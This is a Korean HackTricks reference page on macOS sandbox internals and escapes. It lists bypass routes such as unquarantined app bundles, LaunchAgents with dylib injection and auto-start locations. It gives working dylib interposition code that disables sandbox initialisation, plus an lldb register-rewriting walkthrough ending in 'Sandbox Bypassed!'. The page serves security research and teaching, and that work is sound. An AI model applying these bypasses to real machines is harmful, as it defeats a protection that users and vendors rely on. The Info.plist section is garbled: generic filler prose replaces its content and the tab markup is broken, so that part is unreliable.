# macOS 샌드박스 디버그 및 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 샌드박스 로딩 프로세스

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>이미지 출처: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

이전 이미지에서는 **`com.apple.security.app-sandbox`** 권한을 가진 애플리케이션이 실행될 때 **샌드박스가 로드되는 과정**을 관찰할 수 있습니다.

컴파일러는 `/usr/lib/libSystem.B.dylib`를 이진 파일에 링크합니다.

그런 다음 **`libSystem.B`**은 **`xpc_pipe_routine`**이 앱의 권한을 **`securityd`**에게 보내기까지 여러 함수를 호출합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리됩니다.\
마지막으로, 샌드박스는 **`__sandbox_ms`**를 호출하여 **`__mac_syscall`**을 호출합니다.

## 우회 가능성

### 격리 속성 우회

샌드박스 프로세스가 생성하는 파일은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스된 애플리케이션 내에서 **격리 속성이 없는 `.app` 폴더**를 만들 수 있다면, 앱 번들 이진 파일을 **`/bin/bash`**로 지정하고 **plist**에 일부 환경 변수를 추가하여 **`open`**을 남용하여 **새로운 앱을 샌드박스에서 벗어나게** 할 수 있습니다.

이것은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)에서 수행된 작업입니다.

{% hint style="danger" %}
따라서 현재 당장은 **격리 속성이 없는 `.app` 폴더**를 생성할 수 있다면, macOS는 **격리 속성**을 **`.app` 폴더**와 **주 실행 파일**에서만 확인하기 때문에 샌드박스를 탈출할 수 있습니다. (주 실행 파일을 **`/bin/bash`**로 지정할 것입니다).

이미 실행이 허가된 .app 번들이 있다면 (허가된 실행 플래그가 있는 격리 xttr이 있는 경우), 이를 남용할 수도 있습니다. 그러나 이제 샌드박스 높은 내부에서는 **`.app`** 번들에 쓸 수 없습니다(특권 있는 TCC 권한이 없는 한).
{% endhint %}

### Open 기능 남용

[**Word 샌드박스 우회의 마지막 예제**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서 **`open`** cli 기능이 샌드박스 우회에 남용될 수 있는 방법을 확인할 수 있습니다.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agent/Daemon

애플리케이션이 **샌드박스에 있어야 하는 경우**(`com.apple.security.app-sandbox`), **LaunchAgent**(`~/Library/LaunchAgents`)에서 실행되는 경우 샌드박스를 우회할 수 있습니다.\
[**이 게시물**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명한 대로, 샌드박스가 적용된 애플리케이션을 영구적으로 실행하려면 LaunchAgent로 자동 실행되도록 설정하고 DyLib 환경 변수를 통해 악성 코드를 주입할 수 있습니다.

### Auto Start 위치 남용

샌드박스 프로세스가 **나중에 샌드박스를 벗어날** **비샌드박스 애플리케이션이 이진 파일을 실행할 위치에** **쓸 수 있다면**, 거기에 이진 파일을 놓음으로써 **탈출**할 수 있습니다. 이러한 위치의 좋은 예는 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`입니다.

이를 위해 **2단계**가 필요할 수도 있습니다: **더 관대한 샌드박스**(`file-read*`, `file-write*`)를 가진 프로세스가 실제로 **비샌드박스에서 실행될** 코드를 실행합니다.

**Auto Start 위치**에 대한 이 페이지를 확인하세요:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### 다른 프로세스 남용

샌드박스 프로세스에서 **덜 제한적인 샌드박스**(또는 없음)에서 실행 중인 다른 프로세스를 **침해**할 수 있다면, 해당 샌드박스로 탈출할 수 있습니다.

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### 정적 컴파일 및 동적 링크

[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서는 샌드박스를 우회하는 두 가지 방법을 발견했습니다. 샌드박스는 **libSystem** 라이브러리가 로드될 때 사용자 공간에서 적용됩니다. 이진 파일이 해당 라이브러리를 로드하지 않도록 피할 수 있다면 샌드박스가 적용되지 않을 것입니다:

* 이진 파일이 **완전히 정적으로 컴파일**되면 해당 라이브러리를 로드하지 않을 수 있습니다.
* **이진 파일이 라이브러리를 로드하지 않아도 되는 경우** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.&#x20;

### 쉘코드

ARM64에서도 **쉘코드**는 `libSystem.dylib`에 링크되어야 합니다.
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 권한

애플리케이션이 특정 권한을 가지고 있다면, 샌드박스에서 허용되는 동작이더라도 해당 권한에 따라 특정 동작이 허용될 수 있습니다. 예를 들어:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting**에 대한 자세한 정보는 다음을 참조하십시오:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### `_libsecinit_initializer`를 Interpost하여 샌드박스 방지하기
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### 샌드박스를 우회하기 위해 `__mac_syscall`을 Interpose합니다.

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb를 사용하여 Sandbox 디버그 및 우회하기

Sandbox가 적용되어야 하는 응용 프로그램을 컴파일해 봅시다:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

Info.plist 파일에는 앱의 정보와 설정이 포함되어 있습니다. 이 파일은 macOS 앱의 기본 설정 파일로 사용됩니다. 앱의 이름, 버전, 아이콘, 권한 등의 정보를 포함하고 있습니다. Info.plist 파일은 앱 번들의 최상위 디렉토리에 위치하며, 앱이 실행될 때 macOS가 이 파일을 읽어 앱을 구성합니다.

Info.plist 파일은 XML 형식으로 작성되며, 키-값 쌍으로 구성됩니다. 각 키는 앱의 특정 설정을 나타내며, 해당 값은 설정의 내용을 정의합니다. 이 파일을 수정하여 앱의 동작을 변경하거나 추가 설정을 할 수 있습니다.

앱의 Sandbox 환경을 설정하기 위해서는 Info.plist 파일에 특정 키와 값을 추가해야 합니다. 이를 통해 앱이 특정 리소스에만 접근하도록 제한할 수 있습니다. Sandbox 환경을 설정하면 앱의 보안 수준을 높일 수 있으며, 악성 코드의 실행을 방지할 수 있습니다.

Info.plist 파일을 수정하여 Sandbox 환경을 우회하거나 해제하는 것은 보안 취약점을 악용하는 행위입니다. 이는 macOS 보안 기능을 우회하는 것으로 간주되며, 불법적인 목적으로 사용해서는 안 됩니다.

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

그런 다음 앱을 컴파일합니다:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고 시도**할 것이며, **샌드박스가 허용하지 않습니다**.\
샌드박스를 우회하면 읽을 수 있도록 해당 위치에 파일을 생성하세요:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

애플리케이션을 디버그하여 샌드박스가 언제 로드되는지 확인해 봅시다:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**샌드박스 우회된 경우에도 TCC**는 사용자에게 프로세스가 데스크탑에서 파일을 읽을 것인지 허용할지 물어봅니다.
{% endhint %}

## 참고 자료

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
